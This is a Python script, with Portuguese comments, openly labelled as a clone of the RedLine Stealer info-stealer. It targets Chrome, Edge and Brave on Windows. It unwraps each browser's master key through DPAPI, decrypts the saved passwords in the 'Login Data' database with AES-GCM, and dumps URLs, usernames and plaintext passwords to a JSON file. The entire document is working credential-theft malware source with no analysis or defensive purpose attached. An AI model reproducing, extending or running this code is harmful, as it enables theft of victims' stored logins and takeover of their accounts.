# 🔓 redline_clone.py — Brutal Clone do RedLine Stealer v2 (Chrome, Edge, Brave)
# Dumps: URLs, usernames, senhas salvas. Salva tudo em JSON por navegador.

import os
import json
import shutil
import sqlite3
import base64
import win32crypt
from pathlib import Path
from Crypto.Cipher import AES
BROWSERS = {
    'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default"),
    'Edge': os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default"),
    'Brave': os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Default")
}

def get_master_key(profile_path: str) -> bytes:
    try:
        local_state_path = Path(profile_path).parent / "Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"[ERRO] get_master_key: {e}")
        return b""

def decrypt_password(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if encrypted_value.startswith(b'v10'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        return ""
    except Exception:
        return ""

def dump_passwords(browser: str) -> list:
    profile_path = BROWSERS[browser]
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return []

    temp_copy = login_db + "_tmp"
    shutil.copy2(login_db, temp_copy)
    master_key = get_master_key(profile_path)
    results = []

    try:
        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, master_key)
            if username or password:
                results.append({
                    "url": url,
                    "username": username,
                    "password": password
                })
        conn.close()
    except Exception as e:
        print(f"[ERRO] dump_passwords({browser}): {e}")
    finally:
        if os.path.exists(temp_copy):
            os.remove(temp_copy)
    return results

def save_json(data: dict, filename: str):
    path = Path("output") / filename
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Dump salvo em {path.resolve()}")

def main():
    full_dump = {}
    for browser in BROWSERS:
        print(f"[→] Extraindo de {browser}...")
        full_dump[browser] = dump_passwords(browser)
    save_json(full_dump, "redline_cred_dump.json")

if __name__ == '__main__':
    main()
